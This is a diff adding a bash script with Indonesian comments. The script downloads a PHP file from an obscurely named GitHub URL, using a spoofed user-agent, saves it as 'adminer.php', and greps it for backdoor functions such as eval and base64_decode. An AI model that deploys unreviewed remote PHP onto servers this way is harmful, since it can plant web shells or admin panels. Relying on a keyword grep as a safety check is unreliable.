@@ -1,0 +1,35 @@
+#!/bin/bash
+
+URL="https://raw.githubusercontent.com/okewlalocksystem-tech/BELAWAN/main/a111dsasqsaaasqssaasqasdwasad.txt"
+FILE="adminer.php"
+
+# Download dengan user-agent biar gak dianggap bot
+wget -O "$FILE" "$URL" \
+  --max-redirect=5 \
+  --tries=5 \
+  --timeout=30 \
+  --user-agent="Mozilla/5.0"
+
+# Cek file kosong
+if [ ! -s "$FILE" ]; then
+    echo "❌ File kosong / gagal download"
+    rm -f "$FILE"
+    exit 1
+fi
+
+# Cek apakah benar file PHP
+if ! grep -q "<?php" "$FILE"; then
+    echo "❌ Bukan file PHP valid!"
+    rm -f "$FILE"
+    exit 1
+fi
+
+# Cek indikasi backdoor
+if grep -iE "eval|base64_decode|shell_exec|gzinflate" "$FILE"; then
+    echo "⚠️ Terdeteksi fungsi berbahaya! Kemungkinan malware"
+    exit 1
+fi
+
+chmod 644 "$FILE"
+
+echo "✅ Aman & berhasil download"
